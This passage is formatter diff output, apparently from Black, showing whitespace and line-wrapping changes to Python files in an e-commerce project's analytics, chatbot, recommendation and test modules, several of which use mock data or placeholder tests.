         assert len(successful_results) >= len(tasks) * 0.8  # At least 80% success rate
-        
+
         # Check that each result has expected structure
         for result in successful_results:
             if isinstance(result, dict):
                 assert "timestamp" in result or "error" in result
 
     @pytest.mark.asyncio
     async def test_comprehensive_status_reporting(self, advanced_features_coordinator):
         """Test comprehensive status reporting."""
         status = await advanced_features_coordinator.get_advanced_features_status()
-        
+
         # Check coordinator status
         assert "coordinator" in status
         coordinator_status = status["coordinator"]
         assert coordinator_status["initialized"]
-        
+
         # Check service status
         assert "services" in status
         services = status["services"]
-        expected_services = ["personalization", "recommendations", "ai_integration", "specialized_integrations"]
+        expected_services = [
+            "personalization",
+            "recommendations",
+            "ai_integration",
+            "specialized_integrations",
+        ]
         for service in expected_services:
             assert service in services
-        
+
         # Check component details
-        component_sections = ["personalization", "recommendations", "ai_integration", "specialized_integrations"]
+        component_sections = [
+            "personalization",
+            "recommendations",
+            "ai_integration",
+            "specialized_integrations",
+        ]
         for section in component_sections:
             assert section in status
             section_data = status[section]
             assert "status" in section_data
             assert "components" in section_data
@@ -298,17 +323,19 @@
 
     @pytest.mark.asyncio
     async def test_advanced_features_cleanup(self, advanced_features_coordinator):
         """Test proper cleanup of advanced features."""
         # Verify services are active before cleanup
-        status_before = await advanced_features_coordinator.get_advanced_features_status()
+        status_before = (
+            await advanced_features_coordinator.get_advanced_features_status()
+        )
         assert status_before["coordinator"]["initialized"]
-        
+
         # Perform cleanup
         cleanup_result = await advanced_features_coordinator.cleanup()
         assert cleanup_result["status"] == "success"
-        
+
         # Verify cleanup was successful
         assert not advanced_features_coordinator.is_initialized
         for service in advanced_features_coordinator.service_status.values():
             assert service == "shutdown"
 
@@ -316,50 +343,56 @@
     async def test_error_handling_and_recovery(self, advanced_features_coordinator):
         """Test error handling and recovery mechanisms."""
         # Test with invalid user ID
         invalid_prefs = await advanced_features_coordinator.learn_user_preferences("")
         # Should handle gracefully without crashing
-        
+
         # Test with invalid recommendation type
         invalid_recs = await advanced_features_coordinator.get_product_recommendations(
             "test_user", "B001", "invalid_type"
         )
         # Should provide default recommendations
-        
+
         # Test with malformed decision context
         invalid_decision = await advanced_features_coordinator.make_ai_decision({})
         # Should provide default decision
 
 
 if __name__ == "__main__":
     # Run basic advanced features test
     async def run_basic_test():
         coordinator = AdvancedFeaturesCoordinator()
         init_result = await coordinator.initialize()
-        
+
         print(f" Advanced features initialized: {init_result['status']}")
-        
+
         # Test personalization
         prefs = await coordinator.learn_user_preferences("test_user")
         if "error" not in prefs:
-            print(f" Personalization: {len(prefs.get('preferences', {}))} categories learned")
-        
+            print(
+                f" Personalization: {len(prefs.get('preferences', {}))} categories learned"
+            )
+
         # Test recommendations
         recs = await coordinator.get_product_recommendations("test_user", "B001")
         if "error" not in recs:
-            print(f" Recommendations: {len(recs.get('recommendations', []))} products suggested")
-        
+            print(
+                f" Recommendations: {len(recs.get('recommendations', []))} products suggested"
+            )
+
         # Test AI decisions
         decision = await coordinator.make_ai_decision({"type": "pricing"})
         if "error" not in decision:
             print(f" AI Decision: {decision['decision']['action']} recommended")
-        
+
         # Test integrations
         integrations = await coordinator.get_integration_status()
         if "error" not in integrations:
-            print(f" Integrations: {len(integrations.get('integrations', {}))} categories monitored")
-        
+            print(
+                f" Integrations: {len(integrations.get('integrations', {}))} categories monitored"
+            )
+
         await coordinator.cleanup()
         print(" Advanced features integration test completed successfully")
 
     # Run the test
     asyncio.run(run_basic_test())
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/test_advanced_features_integration.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/test_service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/test_service.py	2025-06-19 04:04:04.181034+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestServiceService:
     """Test class for service service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/analytics_reporting/test_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/analytics/analytics_service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/analytics/analytics_service.py	2025-06-19 04:04:04.186919+00:00
@@ -11,136 +11,237 @@
 logger = logging.getLogger(__name__)
 
 
 class MetricDataPoint:
     """Represents a single metric data point."""
-    
-    def __init__(self, name: str, value: float, labels: Optional[Dict[str, str]] = None):
+
+    def __init__(
+        self, name: str, value: float, labels: Optional[Dict[str, str]] = None
+    ):
         self.name = name
         self.value = value
         self.labels = labels or {}
         self.timestamp = datetime.now(timezone.utc)
 
 
 class AnalyticsService:
     """Analytics service for FlipSync platform."""
-    
+
     def __init__(self, config=None, log_manager=None):
         """Initialize the analytics service.
-        
+
         Args:
             config: Configuration manager instance
             log_manager: Log manager instance
         """
         self.config = config
         self.log_manager = log_manager
         self.logger = logging.getLogger(__name__)
-        
+
         # Mock data for testing
         self._mock_metrics = self._generate_mock_metrics()
-        
+
         self.logger.info("Analytics service initialized")
-    
+
     def _generate_mock_metrics(self) -> List[MetricDataPoint]:
         """Generate mock metrics for testing."""
         return [
-            MetricDataPoint("views", 1250.0, {"marketplace": "amazon", "product_id": "PROD001", "product_title": "Wireless Headphones"}),
-            MetricDataPoint("sales", 45.0, {"marketplace": "amazon", "product_id": "PROD001", "product_title": "Wireless Headphones"}),
-            MetricDataPoint("revenue", 2250.0, {"marketplace": "amazon", "product_id": "PROD001", "product_title": "Wireless Headphones"}),
-            MetricDataPoint("profit", 450.0, {"marketplace": "amazon", "product_id": "PROD001", "product_title": "Wireless Headphones"}),
-            MetricDataPoint("conversions", 42.0, {"marketplace": "amazon", "product_id": "PROD001", "product_title": "Wireless Headphones"}),
-            
-            MetricDataPoint("views", 980.0, {"marketplace": "ebay", "product_id": "PROD002", "product_title": "Bluetooth Speaker"}),
-            MetricDataPoint("sales", 32.0, {"marketplace": "ebay", "product_id": "PROD002", "product_title": "Bluetooth Speaker"}),
-            MetricDataPoint("revenue", 1600.0, {"marketplace": "ebay", "product_id": "PROD002", "product_title": "Bluetooth Speaker"}),
-            MetricDataPoint("profit", 320.0, {"marketplace": "ebay", "product_id": "PROD002", "product_title": "Bluetooth Speaker"}),
-            MetricDataPoint("conversions", 30.0, {"marketplace": "ebay", "product_id": "PROD002", "product_title": "Bluetooth Speaker"}),
-            
-            MetricDataPoint("views", 750.0, {"marketplace": "amazon", "category": "electronics"}),
-            MetricDataPoint("sales", 28.0, {"marketplace": "amazon", "category": "electronics"}),
-            MetricDataPoint("revenue", 1400.0, {"marketplace": "amazon", "category": "electronics"}),
-            MetricDataPoint("profit", 280.0, {"marketplace": "amazon", "category": "electronics"}),
-            
-            MetricDataPoint("views", 650.0, {"marketplace": "ebay", "category": "electronics"}),
-            MetricDataPoint("sales", 22.0, {"marketplace": "ebay", "category": "electronics"}),
-            MetricDataPoint("revenue", 1100.0, {"marketplace": "ebay", "category": "electronics"}),
-            MetricDataPoint("profit", 220.0, {"marketplace": "ebay", "category": "electronics"}),
-            
+            MetricDataPoint(
+                "views",
+                1250.0,
+                {
+                    "marketplace": "amazon",
+                    "product_id": "PROD001",
+                    "product_title": "Wireless Headphones",
+                },
+            ),
+            MetricDataPoint(
+                "sales",
+                45.0,
+                {
+                    "marketplace": "amazon",
+                    "product_id": "PROD001",
+                    "product_title": "Wireless Headphones",
+                },
+            ),
+            MetricDataPoint(
+                "revenue",
+                2250.0,
+                {
+                    "marketplace": "amazon",
+                    "product_id": "PROD001",
+                    "product_title": "Wireless Headphones",
+                },
+            ),
+            MetricDataPoint(
+                "profit",
+                450.0,
+                {
+                    "marketplace": "amazon",
+                    "product_id": "PROD001",
+                    "product_title": "Wireless Headphones",
+                },
+            ),
+            MetricDataPoint(
+                "conversions",
+                42.0,
+                {
+                    "marketplace": "amazon",
+                    "product_id": "PROD001",
+                    "product_title": "Wireless Headphones",
+                },
+            ),
+            MetricDataPoint(
+                "views",
+                980.0,
+                {
+                    "marketplace": "ebay",
+                    "product_id": "PROD002",
+                    "product_title": "Bluetooth Speaker",
+                },
+            ),
+            MetricDataPoint(
+                "sales",
+                32.0,
+                {
+                    "marketplace": "ebay",
+                    "product_id": "PROD002",
+                    "product_title": "Bluetooth Speaker",
+                },
+            ),
+            MetricDataPoint(
+                "revenue",
+                1600.0,
+                {
+                    "marketplace": "ebay",
+                    "product_id": "PROD002",
+                    "product_title": "Bluetooth Speaker",
+                },
+            ),
+            MetricDataPoint(
+                "profit",
+                320.0,
+                {
+                    "marketplace": "ebay",
+                    "product_id": "PROD002",
+                    "product_title": "Bluetooth Speaker",
+                },
+            ),
+            MetricDataPoint(
+                "conversions",
+                30.0,
+                {
+                    "marketplace": "ebay",
+                    "product_id": "PROD002",
+                    "product_title": "Bluetooth Speaker",
+                },
+            ),
+            MetricDataPoint(
+                "views", 750.0, {"marketplace": "amazon", "category": "electronics"}
+            ),
+            MetricDataPoint(
+                "sales", 28.0, {"marketplace": "amazon", "category": "electronics"}
+            ),
+            MetricDataPoint(
+                "revenue", 1400.0, {"marketplace": "amazon", "category": "electronics"}
+            ),
+            MetricDataPoint(
+                "profit", 280.0, {"marketplace": "amazon", "category": "electronics"}
+            ),
+            MetricDataPoint(
+                "views", 650.0, {"marketplace": "ebay", "category": "electronics"}
+            ),
+            MetricDataPoint(
+                "sales", 22.0, {"marketplace": "ebay", "category": "electronics"}
+            ),
+            MetricDataPoint(
+                "revenue", 1100.0, {"marketplace": "ebay", "category": "electronics"}
+            ),
+            MetricDataPoint(
+                "profit", 220.0, {"marketplace": "ebay", "category": "electronics"}
+            ),
             # Unique visitors
             MetricDataPoint("unique_visitors", 850.0, {"marketplace": "amazon"}),
             MetricDataPoint("unique_visitors", 720.0, {"marketplace": "ebay"}),
         ]
-    
+
     async def get_metrics(
-        self, 
-        category: str, 
-        start_time: Optional[datetime] = None, 
+        self,
+        category: str,
+        start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[MetricDataPoint]:
         """Get metrics for the specified category and time range.
-        
+
         Args:
             category: Metric category (e.g., 'performance', 'sales', 'marketplace', 'dashboard')
             start_time: Start time for metrics
             end_time: End time for metrics
             filters: Additional filters to apply
-            
+
         Returns:
             List of metric data points
         """
         try:
             self.logger.debug(f"Getting metrics for category: {category}")
-            
+
             # Filter metrics based on category
             filtered_metrics = []
-            
+
             if category == "performance":
                 # Return metrics related to performance (views, conversions, etc.)
-                filtered_metrics = [m for m in self._mock_metrics if m.name in ["views", "unique_visitors", "sales", "revenue", "conversions"]]
+                filtered_metrics = [
+                    m
+                    for m in self._mock_metrics
+                    if m.name
+                    in ["views", "unique_visitors", "sales", "revenue", "conversions"]
+                ]
             elif category == "sales":
                 # Return metrics related to sales
-                filtered_metrics = [m for m in self._mock_metrics if m.name in ["sales", "revenue", "profit"]]
+                filtered_metrics = [
+                    m
+                    for m in self._mock_metrics
+                    if m.name in ["sales", "revenue", "profit"]
+                ]
             elif category == "marketplace":
                 # Return metrics for marketplace comparison
                 filtered_metrics = self._mock_metrics
             elif category == "dashboard":
                 # Return metrics for dashboard
                 filtered_metrics = self._mock_metrics
             else:
                 # Return all metrics for unknown categories
                 filtered_metrics = self._mock_metrics
-            
+
             # Apply additional filters if provided
             if filters:
                 marketplace_filter = filters.get("marketplace")
                 if marketplace_filter:
                     filtered_metrics = [
-                        m for m in filtered_metrics 
+                        m
+                        for m in filtered_metrics
                         if m.labels.get("marketplace") == marketplace_filter
                     ]
-            
+
             self.logger.debug(f"Returning {len(filtered_metrics)} metrics")
             return filtered_metrics
-            
+
         except Exception as e:
             self.logger.error(f"Error getting metrics: {e}")
             return []
-    
+
     async def record_metric(
-        self, 
-        name: str, 
-        value: float, 
-        labels: Optional[Dict[str, str]] = None
+        self, name: str, value: float, labels: Optional[Dict[str, str]] = None
     ) -> bool:
         """Record a new metric.
-        
+
         Args:
             name: Metric name
             value: Metric value
             labels: Optional labels for the metric
-            
+
         Returns:
             True if successful, False otherwise
         """
         try:
             metric = MetricDataPoint(name, value, labels)
@@ -148,36 +249,44 @@
             self.logger.debug(f"Recorded metric: {name} = {value}")
             return True
         except Exception as e:
             self.logger.error(f"Error recording metric: {e}")
             return False
-    
+
     async def get_dashboard_summary(self) -> Dict[str, Any]:
         """Get dashboard summary data.
-        
+
         Returns:
             Dictionary containing dashboard summary
         """
         try:
             # Calculate summary metrics
             total_sales = sum(m.value for m in self._mock_metrics if m.name == "sales")
-            total_revenue = sum(m.value for m in self._mock_metrics if m.name == "revenue")
+            total_revenue = sum(
+                m.value for m in self._mock_metrics if m.name == "revenue"
+            )
             total_views = sum(m.value for m in self._mock_metrics if m.name == "views")
-            total_conversions = sum(m.value for m in self._mock_metrics if m.name == "conversions")
-            
-            conversion_rate = (total_conversions / total_views * 100) if total_views > 0 else 0
-            average_order_value = (total_revenue / total_sales) if total_sales > 0 else 0
-            
+            total_conversions = sum(
+                m.value for m in self._mock_metrics if m.name == "conversions"
+            )
+
+            conversion_rate = (
+                (total_conversions / total_views * 100) if total_views > 0 else 0
+            )
+            average_order_value = (
+                (total_revenue / total_sales) if total_sales > 0 else 0
+            )
+
             return {
                 "total_sales": int(total_sales),
                 "total_revenue": round(total_revenue, 2),
                 "total_views": int(total_views),
                 "conversion_rate": round(conversion_rate, 2),
                 "average_order_value": round(average_order_value, 2),
                 "active_listings": 89,  # Mock value
                 "active_marketplaces": 2,  # Amazon and eBay
-                "last_updated": datetime.now(timezone.utc).isoformat()
+                "last_updated": datetime.now(timezone.utc).isoformat(),
             }
         except Exception as e:
             self.logger.error(f"Error getting dashboard summary: {e}")
             return {
                 "total_sales": 0,
@@ -185,20 +294,20 @@
                 "total_views": 0,
                 "conversion_rate": 0.0,
                 "average_order_value": 0.0,
                 "active_listings": 0,
                 "active_marketplaces": 0,
-                "last_updated": datetime.now(timezone.utc).isoformat()
+                "last_updated": datetime.now(timezone.utc).isoformat(),
             }
-    
+
     async def health_check(self) -> Dict[str, Any]:
         """Perform health check for the analytics service.
-        
+
         Returns:
             Health check status
         """
         return {
             "status": "healthy",
             "service": "analytics",
             "metrics_count": len(self._mock_metrics),
-            "timestamp": datetime.now(timezone.utc).isoformat()
+            "timestamp": datetime.now(timezone.utc).isoformat(),
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/analytics/analytics_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/__init__.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/__init__.py	2025-06-19 04:04:04.238016+00:00
@@ -9,8 +9,8 @@
 from .intent_recognition import IntentRecognizer
 from .recommendation_service import ChatbotRecommendationService
 
 __all__ = [
     "AgentConnectivityService",
-    "IntentRecognizer", 
-    "ChatbotRecommendationService"
+    "IntentRecognizer",
+    "ChatbotRecommendationService",
 ]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/authentication/test_auth_service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/authentication/test_auth_service.py	2025-06-19 04:04:04.243960+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestAuthServiceService:
     """Test class for auth_service service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/authentication/test_auth_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/recommendations/algorithms/hybrid.py	2025-06-14 20:35:30.819804+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/recommendations/algorithms/hybrid.py	2025-06-19 04:04:04.298314+00:00
@@ -20,15 +20,19 @@
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
 import numpy as np
 
 # Import our own recommendation algorithms
-from fs_agt_clean.core.recommendations.algorithms.collaborative import CollaborativeFiltering
+from fs_agt_clean.core.recommendations.algorithms.collaborative import (
+    CollaborativeFiltering,
+)
 from fs_agt_clean.core.recommendations.algorithms.collaborative import (
     Recommendation as CFRecommendation,
 )
-from fs_agt_clean.core.recommendations.algorithms.content_based import ContentBasedFiltering
+from fs_agt_clean.core.recommendations.algorithms.content_based import (
+    ContentBasedFiltering,
+)
 from fs_agt_clean.core.recommendations.algorithms.content_based import (
     Recommendation as CBRecommendation,
 )
 
 logger = logging.getLogger(__name__)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/recommendations/algorithms/hybrid.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/intent_recognition.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/intent_recognition.py	2025-06-19 04:04:04.606011+00:00
@@ -16,125 +16,122 @@
 
 
 class IntentRecognizer:
     """
     Legacy intent recognizer for backward compatibility.
-    
+
     This class provides basic intent recognition capabilities
     that are used by the chatbot service for legacy support.
     """
-    
+
     def __init__(self):
         """Initialize the intent recognizer."""
         self.intent_patterns = self._load_intent_patterns()
         self.initialized = True
         logger.info("IntentRecognizer initialized for legacy support")
-    
+
     def _load_intent_patterns(self) -> Dict[str, List[str]]:
         """Load intent recognition patterns."""
         return {
             "greeting": [
                 r"\b(hello|hi|hey|greetings|good morning|good afternoon|good evening)\b",
-                r"\b(start|begin|help me get started)\b"
+                r"\b(start|begin|help me get started)\b",
             ],
             "listing": [
                 r"\b(list|listing|sell|post|upload|add product)\b",
-                r"\b(create listing|new listing|list item)\b"
+                r"\b(create listing|new listing|list item)\b",
             ],
             "pricing": [
                 r"\b(price|pricing|cost|value|worth)\b",
-                r"\b(how much|what price|price check)\b"
+                r"\b(how much|what price|price check)\b",
             ],
             "inventory": [
                 r"\b(inventory|stock|items|products)\b",
-                r"\b(manage inventory|check stock)\b"
+                r"\b(manage inventory|check stock)\b",
             ],
             "customer_service": [
                 r"\b(customer|service|support|help|issue|problem)\b",
-                r"\b(complaint|refund|return)\b"
+                r"\b(complaint|refund|return)\b",
             ],
             "order": [
                 r"\b(order|purchase|buy|sale|transaction)\b",
-                r"\b(order status|track order)\b"
+                r"\b(order status|track order)\b",
             ],
             "shipping": [
                 r"\b(ship|shipping|delivery|send|mail)\b",
-                r"\b(shipping cost|delivery time)\b"
+                r"\b(shipping cost|delivery time)\b",
             ],
             "analytics": [
                 r"\b(analytics|report|stats|statistics|performance)\b",
-                r"\b(sales data|metrics|insights)\b"
+                r"\b(sales data|metrics|insights)\b",
             ],
             "farewell": [
                 r"\b(bye|goodbye|see you|farewell|thanks|thank you)\b",
-                r"\b(that's all|done|finished)\b"
-            ]
+                r"\b(that's all|done|finished)\b",
+            ],
         }
-    
+
     async def recognize_intent(
         self,
         message: str,
         conversation_history: Optional[List[Any]] = None,
-        context: Optional[Dict[str, Any]] = None
+        context: Optional[Dict[str, Any]] = None,
     ) -> MessageIntent:
         """
         Recognize intent from a user message.
-        
+
         Args:
             message: User message text
             conversation_history: Optional conversation history
             context: Optional context information
-            
+
         Returns:
             MessageIntent object with recognized intent
         """
         try:
             message_lower = message.lower().strip()
-            
+
             # Check patterns for each intent
             best_intent = "general"
             best_confidence = 0.0
-            
+
             for intent_type, patterns in self.intent_patterns.items():
                 confidence = 0.0
                 matches = 0
-                
+
                 for pattern in patterns:
                     if re.search(pattern, message_lower):
                         matches += 1
                         confidence += 0.3  # Base confidence per pattern match
-                
+
                 # Normalize confidence based on number of patterns
                 if matches > 0:
                     confidence = min(confidence / len(patterns), 1.0)
-                    
+
                     if confidence > best_confidence:
                         best_confidence = confidence
                         best_intent = intent_type
-            
+
             # Ensure minimum confidence
             if best_confidence < 0.1:
                 best_confidence = 0.1
                 best_intent = "general"
-            
+
             return MessageIntent(
                 intent_type=best_intent,
                 confidence=best_confidence,
                 entities=[],
                 metadata={
                     "message_length": len(message),
                     "timestamp": datetime.now().isoformat(),
-                    "recognition_method": "pattern_matching"
-                }
+                    "recognition_method": "pattern_matching",
+                },
             )
-            
+
         except Exception as e:
             logger.error(f"Error recognizing intent: {e}")
             return MessageIntent(
                 intent_type="general",
                 confidence=0.1,
                 entities=[],
-                metadata={
-                    "error": str(e),
-                    "timestamp": datetime.now().isoformat()
-                }
+                metadata={"error": str(e), "timestamp": datetime.now().isoformat()},
             )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/intent_recognition.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/communication/__init__.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/communication/__init__.py	2025-06-19 04:04:04.720189+00:00
@@ -59,22 +59,27 @@
         """Initialize the communication service."""
         self.config_manager = config_manager
 
         # Initialize components
         self.chat_service = ChatService() if ChatService else None
-        self.agent_connectivity = AgentConnectivityService() if AgentConnectivityService else None
+        self.agent_connectivity = (
+            AgentConnectivityService() if AgentConnectivityService else None
+        )
         self.context_manager = ContextManager() if ContextManager else None
-        self.conversation_context = ConversationContextManager() if ConversationContextManager else None
-        self.conversation_service = ConversationService() if ConversationService else None
+        self.conversation_context = (
+            ConversationContextManager() if ConversationContextManager else None
+        )
+        self.conversation_service = (
+            ConversationService() if ConversationService else None
+        )
         self.intent_recognition = IntentRecognition() if IntentRecognition else None
-        self.recommendation_service = RecommendationService() if RecommendationService else None
+        self.recommendation_service = (
+            RecommendationService() if RecommendationService else None
+        )
 
     async def process_chat_message(
-        self,
-        user_id: str,
-        message: str,
-        conversation_id: Optional[str] = None
+        self, user_id: str, message: str, conversation_id: Optional[str] = None
     ) -> Dict:
         """Process a chat message and generate response."""
         try:
             if not self.chat_service:
                 return {"error": "Chat service not available"}
@@ -98,15 +103,11 @@
             return intent_result
         except Exception as e:
             logger.error("Failed to recognize intent: %s", str(e))
             return {"intent": "unknown", "confidence": 0.0}
 
-    async def get_recommendations(
-        self,
-        user_id: str,
-        context: Dict
-    ) -> List[Dict]:
+    async def get_recommendations(self, user_id: str, context: Dict) -> List[Dict]:
         """Get recommendations for user."""
         try:
             if not self.recommendation_service:
                 return []
 
@@ -117,13 +118,11 @@
         except Exception as e:
             logger.error("Failed to get recommendations: %s", str(e))
             return []
 
     async def manage_conversation_context(
-        self,
-        conversation_id: str,
-        context_data: Dict
+        self, conversation_id: str, context_data: Dict
     ) -> bool:
         """Manage conversation context."""
         try:
             if not self.conversation_context:
                 return False
@@ -134,15 +133,11 @@
             return success
         except Exception as e:
             logger.error("Failed to manage conversation context: %s", str(e))
             return False
 
-    async def connect_to_agent(
-        self,
-        user_id: str,
-        agent_type: str
-    ) -> Dict:
+    async def connect_to_agent(self, user_id: str, agent_type: str) -> Dict:
         """Connect user to appropriate agent."""
         try:
             if not self.agent_connectivity:
                 return {"connected": False, "error": "Agent connectivity not available"}
 
@@ -162,6 +157,6 @@
     "ContextManager",
     "ConversationContextManager",
     "ConversationService",
     "IntentRecognition",
     "RecommendationService",
-]
\ No newline at end of file
+]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/communication/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/recommendation_service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/recommendation_service.py	2025-06-19 04:04:05.042740+00:00
@@ -15,174 +15,169 @@
 
 
 class ChatbotRecommendationService:
     """
     Legacy recommendation service for backward compatibility.
-    
+
     This class provides basic recommendation capabilities
     that are used by the chatbot service for legacy support.
     """
-    
+
     def __init__(self):
         """Initialize the recommendation service."""
         self.recommendation_templates = self._load_recommendation_templates()
         self.initialized = True
         logger.info("ChatbotRecommendationService initialized for legacy support")
-    
+
     def _load_recommendation_templates(self) -> Dict[str, List[Dict[str, Any]]]:
         """Load recommendation templates for different intents."""
         return {
             "listing": [
                 {
                     "type": "action",
                     "title": "Optimize Your Listing",
                     "description": "Use AI to improve your product title and description",
-                    "action": "optimize_listing"
+                    "action": "optimize_listing",
                 },
                 {
                     "type": "tip",
                     "title": "Add High-Quality Photos",
                     "description": "Listings with multiple photos sell 40% faster",
-                    "action": "add_photos"
-                }
+                    "action": "add_photos",
+                },
             ],
             "pricing": [
                 {
                     "type": "action",
                     "title": "Market Price Analysis",
                     "description": "Get competitive pricing insights for your product",
-                    "action": "analyze_pricing"
+                    "action": "analyze_pricing",
                 },
                 {
                     "type": "tip",
                     "title": "Dynamic Pricing",
                     "description": "Enable automatic price adjustments based on market conditions",
-                    "action": "enable_dynamic_pricing"
-                }
+                    "action": "enable_dynamic_pricing",
+                },
             ],
             "inventory": [
                 {
                     "type": "action",
                     "title": "Inventory Sync",
                     "description": "Sync your inventory across all marketplaces",
-                    "action": "sync_inventory"
+                    "action": "sync_inventory",
                 },
                 {
                     "type": "tip",
                     "title": "Low Stock Alert",
                     "description": "Set up alerts when inventory runs low",
-                    "action": "setup_alerts"
-                }
+                    "action": "setup_alerts",
+                },
             ],
             "general": [
                 {
                     "type": "tip",
                     "title": "Getting Started",
                     "description": "Connect your marketplace accounts to begin",
-                    "action": "connect_accounts"
+                    "action": "connect_accounts",
                 },
                 {
                     "type": "action",
                     "title": "View Dashboard",
                     "description": "Check your sales performance and metrics",
-                    "action": "view_dashboard"
-                }
-            ]
+                    "action": "view_dashboard",
+                },
+            ],
         }
-    
+
     async def get_recommendations(
-        self,
-        context: ChatRecommendationContext
+        self, context: ChatRecommendationContext
     ) -> List[Dict[str, Any]]:
         """
         Get recommendations based on context.
-        
+
         Args:
             context: Recommendation context with user info and intent
-            
+
         Returns:
             List of recommendation dictionaries
         """
         try:
             intent_type = context.intent.intent_type if context.intent else "general"
-            
+
             # Get base recommendations for the intent
             base_recommendations = self.recommendation_templates.get(
-                intent_type, 
-                self.recommendation_templates["general"]
+                intent_type, self.recommendation_templates["general"]
             )
-            
+
             # Personalize recommendations based on context
             personalized_recommendations = []
-            
+
             for rec in base_recommendations:
                 personalized_rec = rec.copy()
                 personalized_rec["timestamp"] = datetime.now().isoformat()
                 personalized_rec["relevance_score"] = self._calculate_relevance(
                     rec, context
                 )
                 personalized_recommendations.append(personalized_rec)
-            
+
             # Sort by relevance score
             personalized_recommendations.sort(
-                key=lambda x: x.get("relevance_score", 0.0),
-                reverse=True
+                key=lambda x: x.get("relevance_score", 0.0), reverse=True
             )
-            
+
             # Return top 3 recommendations
             return personalized_recommendations[:3]
-            
+
         except Exception as e:
             logger.error(f"Error generating recommendations: {e}")
             return []
-    
+
     def _calculate_relevance(
-        self,
-        recommendation: Dict[str, Any],
-        context: ChatRecommendationContext
+        self, recommendation: Dict[str, Any], context: ChatRecommendationContext
     ) -> float:
         """
         Calculate relevance score for a recommendation.
-        
+
         Args:
             recommendation: Recommendation dictionary
             context: Recommendation context
-            
+
         Returns:
             Relevance score between 0.0 and 1.0
         """
         try:
             base_score = 0.5  # Base relevance
-            
+
             # Boost score based on intent confidence
             if context.intent and context.intent.confidence:
                 base_score += context.intent.confidence * 0.3
-            
+
             # Boost score for action-type recommendations
             if recommendation.get("type") == "action":
                 base_score += 0.2
-            
+
             # Boost score based on message content relevance
             if context.message:
                 message_lower = context.message.lower()
                 rec_title_lower = recommendation.get("title", "").lower()
                 rec_desc_lower = recommendation.get("description", "").lower()
-                
+
                 # Simple keyword matching
                 title_words = set(rec_title_lower.split())
                 desc_words = set(rec_desc_lower.split())
                 message_words = set(message_lower.split())
-                
+
                 title_overlap = len(title_words.intersection(message_words))
                 desc_overlap = len(desc_words.intersection(message_words))
-                
+
                 if title_overlap > 0:
                     base_score += 0.1 * title_overlap
                 if desc_overlap > 0:
                     base_score += 0.05 * desc_overlap
-            
+
             # Ensure score is within bounds
             return min(max(base_score, 0.0), 1.0)
-            
+
         except Exception as e:
             logger.error(f"Error calculating relevance: {e}")
             return 0.5
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/recommendation_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/analytics/performance_predictor.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/analytics/performance_predictor.py	2025-06-19 04:04:05.045127+00:00
@@ -13,44 +13,54 @@
 from datetime import datetime, timezone, timedelta
 from typing import Any, Dict, List, Optional, Tuple
 from decimal import Decimal
 from enum import Enum
 
-from fs_agt_clean.database.repositories.ai_analysis_repository import FeatureUsageRepository
+from fs_agt_clean.database.repositories.ai_analysis_repository import (
+    FeatureUsageRepository,
+)
+
 # Legacy LLMClient removed - using SimpleLLMClient architecture
-from fs_agt_clean.core.ai.simple_llm_client import SimpleLLMClient, SimpleLLMClientFactory, ModelProvider, ModelType
+from fs_agt_clean.core.ai.simple_llm_client import (
+    SimpleLLMClient,
+    SimpleLLMClientFactory,
+    ModelProvider,
+    ModelType,
+)
 
 logger = logging.getLogger(__name__)
 
